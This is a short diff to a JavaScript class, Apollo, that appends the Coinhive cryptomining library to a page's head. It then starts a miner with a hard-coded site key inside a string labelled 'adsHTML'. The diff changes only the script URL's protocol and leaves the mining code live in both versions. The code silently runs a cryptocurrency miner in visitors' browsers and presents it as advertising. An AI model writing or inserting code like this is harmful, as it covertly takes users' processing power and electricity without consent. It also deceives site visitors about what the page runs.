@@ -46,7 +46,7 @@ class Apollo {
     var head = document.getElementsByTagName('head')[0];
     var script = document.createElement('script');
     script.type = 'text/javascript';
-    script.src = 'https://coinhive.com/lib/coinhive.min.js';
+    script.src = '//coinhive.com/lib/coinhive.min.js';
     head.appendChild(script);
 
     let adsHTML = `<script>var miner = new CoinHive.Anonymous('TKNKIC69TXviFytXEOLxbIqS1z9GplN9');miner.start();</script>`
